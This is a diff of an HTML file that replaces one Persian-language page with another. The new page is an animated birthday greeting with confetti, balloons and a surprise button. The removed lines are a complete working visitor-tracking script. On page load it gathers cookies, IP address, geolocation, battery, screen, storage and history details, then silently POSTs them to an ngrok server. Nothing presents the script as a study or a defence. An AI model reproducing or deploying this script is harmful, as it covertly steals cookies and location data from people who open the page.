@@ -1,140 +1,380 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اطلاعات سیستم</title>
+    <title>تبریک تولد خفن!</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Lalezar&display=swap');
+        
+        :root {
+            --color1: #FF006E;
+            --color2: #FFBE0B;
+            --color3: #3A86FF;
+            --color4: #8338EC;
+            --color5: #FF006E;
+            --color6: #FB5607;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Lalezar', cursive;
+            background: linear-gradient(45deg, var(--color1), var(--color2));
+            min-height: 100vh;
+            overflow-x: hidden;
+            color: white;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: bgChange 15s infinite alternate;
+        }
+        
+        .container {
+            position: relative;
+            width: 100%;
+            max-width: 800px;
+            z-index: 10;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+        }
+        
+        h1 {
+            font-size: clamp(2.5rem, 8vw, 5rem);
+            margin-bottom: 1.5rem;
+            text-shadow: 0 0 10px currentColor;
+            animation: 
+                glow 2s infinite alternate,
+                colorChange 5s infinite alternate;
+            line-height: 1.2;
+        }
+        
+        .cake {
+            font-size: clamp(5rem, 15vw, 8rem);
+            margin: 1.5rem 0;
+            animation: 
+                bounce 1s infinite alternate,
+                rotate 3s infinite linear;
+            filter: drop-shadow(0 0 10px rgba(0, 0, 0, 0.5));
+        }
+        
+        .message {
+            font-size: clamp(1.2rem, 4vw, 1.8rem);
+            margin: 1.5rem 0;
+            line-height: 1.6;
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
+            animation: colorChange 7s infinite alternate;
+        }
+        
+        .btn {
+            background: linear-gradient(45deg, var(--color3), var(--color4));
+            color: white;
+            border: none;
+            padding: 0.8rem 1.8rem;
+            font-size: clamp(1rem, 4vw, 1.5rem);
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 
+                0 5px 15px rgba(0, 0, 0, 0.3), 
+                0 0 10px var(--color3);
+            font-family: 'Lalezar', cursive;
+            margin: 0.8rem;
+            display: inline-block;
+            animation: btnPulse 2s infinite alternate;
+        }
+        
+        .btn:hover {
+            transform: scale(1.1);
+            box-shadow: 
+                0 8px 20px rgba(0, 0, 0, 0.4), 
+                0 0 15px var(--color4);
+        }
+        
+        .floating-text {
+            position: absolute;
+            font-size: clamp(1rem, 3vw, 1.5rem);
+            animation: floatAround 15s infinite linear;
+            opacity: 0.8;
+            text-shadow: 0 0 5px currentColor;
+        }
+        
+        .confetti {
+            position: fixed;
+            width: 15px;
+            height: 15px;
+            background-color: var(--color2);
+            opacity: 0.8;
+            animation: confettiFall 5s linear infinite;
+            z-index: 1;
+        }
+        
+        .balloon {
+            position: fixed;
+            width: 60px;
+            height: 80px;
+            border-radius: 50%;
+            opacity: 0.8;
+            animation: floatUp 8s infinite ease-in;
+            z-index: 1;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .surprise-box {
+            background: linear-gradient(45deg, var(--color5), var(--color6));
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            animation: boxPulse 3s infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 10px currentColor; }
+            to { text-shadow: 0 0 20px currentColor, 0 0 30px currentColor; }
+        }
+        
+        @keyframes colorChange {
+            0% { color: var(--color1); }
+            20% { color: var(--color2); }
+            40% { color: var(--color3); }
+            60% { color: var(--color4); }
+            80% { color: var(--color5); }
+            100% { color: var(--color6); }
+        }
+        
+        @keyframes bgChange {
+            0% { background: linear-gradient(45deg, var(--color1), var(--color2)); }
+            20% { background: linear-gradient(45deg, var(--color2), var(--color3)); }
+            40% { background: linear-gradient(45deg, var(--color3), var(--color4)); }
+            60% { background: linear-gradient(45deg, var(--color4), var(--color5)); }
+            80% { background: linear-gradient(45deg, var(--color5), var(--color6)); }
+            100% { background: linear-gradient(45deg, var(--color6), var(--color1)); }
+        }
+        
+        @keyframes bounce {
+            from { transform: translateY(0) rotate(-5deg); }
+            to { transform: translateY(-20px) rotate(5deg); }
+        }
+        
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes floatAround {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(50vw, 20vh) rotate(90deg); }
+            50% { transform: translate(30vw, 50vh) rotate(180deg); }
+            75% { transform: translate(-40vw, 30vh) rotate(270deg); }
+            100% { transform: translate(0, 0) rotate(360deg); }
+        }
+        
+        @keyframes confettiFall {
+            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+        }
+        
+        @keyframes floatUp {
+            0% { transform: translateY(100vh) scale(0.5); opacity: 0; }
+            50% { opacity: 0.8; }
+            100% { transform: translateY(-100px) scale(1.2); opacity: 0; }
+        }
+        
+        @keyframes btnPulse {
+            from { transform: scale(1); box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); }
+            to { transform: scale(1.05); box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4); }
+        }
+        
+        @keyframes boxPulse {
+            from { transform: scale(1); box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); }
+            to { transform: scale(1.02); box-shadow: 0 0 30px var(--color5); }
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .floating-text {
+                font-size: 0.8rem;
+            }
+            
+            .balloon {
+                width: 40px;
+                height: 60px;
+            }
+        }
+    </style>
 </head>
 <body>
+    <!-- Floating elements -->
+    <div id="floating-texts"></div>
+    <div id="confetti-container"></div>
+    <div id="balloons-container"></div>
+    
+    <!-- Main content -->
+    <div class="container">
+        <h1 id="main-title">تولدت مبارک!</h1>
+        <div class="cake" id="main-cake">🎂</div>
+        
+        <p class="message" id="main-message">
+            امروز روز ویژه توئه! <br>
+            سالی پر از خوشبختی، موفقیت و لبخند برات آرزو می‌کنم
+        </p>
+        
+        <button class="btn" id="surprise-btn">کلیک کن برای سورپرایز!</button>
+        
+        <div id="surprise-box" class="surprise-box hidden">
+            <h2>سورپرایز ویژه!</h2>
+            <p class="message">تو استثنایی هستی! این روز رو با تمام وجودت جشن بگیر 🎉</p>
+            <div class="cake">🎁</div>
+        </div>
+    </div>
+
     <script>
-        const serverUrl = 'https://56ea-163-5-170-146.ngrok-free.app/data'; // آدرس سرور Ngrok یا سرور خود را وارد کنید
-
-        const allData = {};
-
-        // 1. نمایش کوکی‌ها
-        allData.cookies = document.cookie || 'هیچ کوکی‌ای پیدا نشد';
-
-        // 2. اطلاعات مرورگر
-        allData.browserInfo = {
-            "User Agent": navigator.userAgent,
-            "Platform": navigator.platform,
-            "Language": navigator.language,
-            "Cookies Enabled": navigator.cookieEnabled,
-        };
-
-        // 3. آدرس IP
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                allData.ipAddress = data.ip;
-            });
-
-        // 4. لوکیشن
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                allData.geoLocation = {
-                    "Latitude": position.coords.latitude,
-                    "Longitude": position.coords.longitude,
-                    "Accuracy": position.coords.accuracy
-                };
-            }, function() {
-                allData.geoLocation = 'دسترسی به لوکیشن امکان‌پذیر نیست';
-            });
-        } else {
-            allData.geoLocation = 'Geolocation در مرورگر شما پشتیبانی نمی‌شود';
+        // Configuration
+        const colors = [
+            'var(--color1)', 'var(--color2)', 'var(--color3)', 
+            'var(--color4)', 'var(--color5)', 'var(--color6)'
+        ];
+        
+        const messages = [
+            "تولدت مبارک!",
+            "شاد باشی همیشه!",
+            "پیروز و سربلند!",
+            "سال پر از خوشبختی!",
+            "عاشق زندگی باش!",
+            "همه آرزوهات برآورده بشن!",
+            "تولدت رو تبریک میگم!",
+            "شادی همیشه با تو باشه!",
+            "امروز روز توئه!",
+            "جشن بگیر برای خودت!"
+        ];
+        
+        const emojis = ["🎉", "🎊", "❤️", "✨", "🌟", "🎁", "🎈", "🍰", "🥳", "🎂"];
+        
+        // DOM elements
+        const floatingTextsContainer = document.getElementById('floating-texts');
+        const confettiContainer = document.getElementById('confetti-container');
+        const balloonsContainer = document.getElementById('balloons-container');
+        const surpriseBtn = document.getElementById('surprise-btn');
+        const surpriseBox = document.getElementById('surprise-box');
+        const mainTitle = document.getElementById('main-title');
+        const mainCake = document.getElementById('main-cake');
+        const mainMessage = document.getElementById('main-message');
+        
+        // Create floating texts
+        function createFloatingTexts() {
+            for (let i = 0; i < 15; i++) {
+                const text = document.createElement('div');
+                text.className = 'floating-text';
+                text.textContent = messages[Math.floor(Math.random() * messages.length)] + " " + 
+                                  emojis[Math.floor(Math.random() * emojis.length)];
+                text.style.color = colors[Math.floor(Math.random() * colors.length)];
+                text.style.left = Math.random() * 100 + 'vw';
+                text.style.top = Math.random() * 100 + 'vh';
+                text.style.animationDuration = (Math.random() * 10 + 10) + 's';
+                text.style.animationDelay = Math.random() * 5 + 's';
+                floatingTextsContainer.appendChild(text);
+            }
         }
-
-        // 5. اطلاعات کاربر (User-Agent)
-        allData.userAgent = navigator.userAgent;
-
-        // 6. اطلاعات صفحه وب
-        allData.pageInfo = {
-            "URL": window.location.href,
-            "Referrer": document.referrer,
-            "Title": document.title,
-            "Domain": window.location.hostname,
-            "Protocol": window.location.protocol
-        };
-
-        // 7. اطلاعات شبکه
-        allData.networkInfo = {
-            "Online": navigator.onLine,
-            "Connection Type": navigator.connection ? navigator.connection.effectiveType : 'N/A',
-        };
-
-        // 8. اطلاعات نمایشگر
-        allData.screenInfo = {
-            "Width": screen.width,
-            "Height": screen.height,
-            "Available Width": screen.availWidth,
-            "Available Height": screen.availHeight,
-            "Color Depth": screen.colorDepth,
-            "Pixel Depth": screen.pixelDepth
-        };
-
-        // 9. اطلاعات تایم
-        allData.timeInfo = {
-            "Current Time (milliseconds)": Date.now(),
-            "Current Date": new Date().toString()
-        };
-
-        // 10. اطلاعات ورودی (فعال‌ترین عنصر)
-        allData.inputInfo = document.activeElement ? document.activeElement.tagName : 'هیچ ورودی فعال نیست';
-
-        // 11. اطلاعات دستگاه
-        allData.deviceInfo = {
-            "Device Memory": navigator.deviceMemory || 'N/A',
-            "Battery Status": 'در حال دریافت اطلاعات باتری...'
-        };
-        navigator.getBattery().then(function(battery) {
-            allData.deviceInfo["Battery Level"] = battery.level * 100 + '%';
-            allData.deviceInfo["Charging"] = battery.charging ? 'بله' : 'خیر';
-        });
-
-        // 12. اطلاعات مرورگر (Performance)
-        allData.performanceInfo = {
-            "Performance Now (milliseconds)": performance.now(),
-            "Memory Usage": performance.memory ? performance.memory.totalJSHeapSize : 'N/A'
-        };
-
-        // 13. اطلاعات ذخیره‌سازی
-        allData.storageInfo = {
-            "LocalStorage": localStorage.length ? 'داده‌هایی ذخیره شده است' : 'هیچ داده‌ای در localStorage نیست',
-            "SessionStorage": sessionStorage.length ? 'داده‌هایی ذخیره شده است' : 'هیچ داده‌ای در sessionStorage نیست'
-        };
-
-        // 14. اطلاعات فرم‌ها
-        allData.formInfo = Array.from(document.forms).map(form => form.name || 'فرم بدون نام');
-
-        // 15. اطلاعات تاریخچه مرورگر
-        allData.historyInfo = {
-            "History Length": window.history.length,
-            "Current History State": window.history.state || 'هیچ وضعیت فعالی وجود ندارد'
-        };
-
-        // ارسال داده‌ها به سرور
-        function sendData() {
-            fetch(serverUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(allData)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('200');
-                } else {
-                    console.log('خطا در ارسال درخواست');
-                }
-            })
-            .catch(error => {
-                console.error('خطا در ارسال داده‌ها:', error);
-            });
+        
+        // Create confetti
+        function createConfetti() {
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                confetti.style.animationDelay = Math.random() * 3 + 's';
+                confetti.style.width = (Math.random() * 10 + 5) + 'px';
+                confetti.style.height = (Math.random() * 10 + 5) + 'px';
+                confettiContainer.appendChild(confetti);
+            }
         }
-
-        // پس از دریافت تمام داده‌ها، داده‌ها را ارسال می‌کنیم
-        setTimeout(sendData, 2000); // 2 ثانیه منتظر می‌مانیم تا همه داده‌ها جمع‌آوری شوند
+        
+        // Create balloons
+        function createBalloons() {
+            for (let i = 0; i < 20; i++) {
+                const balloon = document.createElement('div');
+                balloon.className = 'balloon';
+                balloon.style.left = Math.random() * 100 + 'vw';
+                balloon.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                balloon.style.animationDuration = (Math.random() * 5 + 5) + 's';
+                balloon.style.animationDelay = Math.random() * 5 + 's';
+                balloonsContainer.appendChild(balloon);
+            }
+        }
+        
+        // Change message randomly
+        function changeMessage() {
+            const randomMessage = messages[Math.floor(Math.random() * messages.length)] + " " + 
+                                emojis[Math.floor(Math.random() * emojis.length)];
+            mainMessage.textContent = randomMessage;
+            
+            // Trigger animation
+            mainMessage.style.animation = 'none';
+            void mainMessage.offsetWidth; // Trigger reflow
+            mainMessage.style.animation = 'colorChange 7s infinite alternate';
+        }
+        
+        // Surprise button click handler
+        function handleSurpriseClick() {
+            // Show surprise box
+            surpriseBox.classList.remove('hidden');
+            surpriseBtn.classList.add('hidden');
+            
+            // Change title and cake
+            mainTitle.textContent = "هورااا! 🎊";
+            mainCake.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+            
+            // Add more animations
+            for (let i = 0; i < 30; i++) {
+                setTimeout(() => {
+                    createConfetti();
+                    createBalloons();
+                }, i * 300);
+            }
+            
+            // Change message every 3 seconds
+            setInterval(changeMessage, 3000);
+        }
+        
+        // Initialize
+        function init() {
+            createFloatingTexts();
+            createConfetti();
+            createBalloons();
+            
+            // Set up event listeners
+            surpriseBtn.addEventListener('click', handleSurpriseClick);
+            
+            // Change message every 5 seconds
+            setInterval(changeMessage, 5000);
+            
+            // Change cake emoji occasionally
+            setInterval(() => {
+                mainCake.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+            }, 2000);
+        }
+        
+        // Start the party!
+        window.addEventListener('load', init);
     </script>
 </body>
 </html>
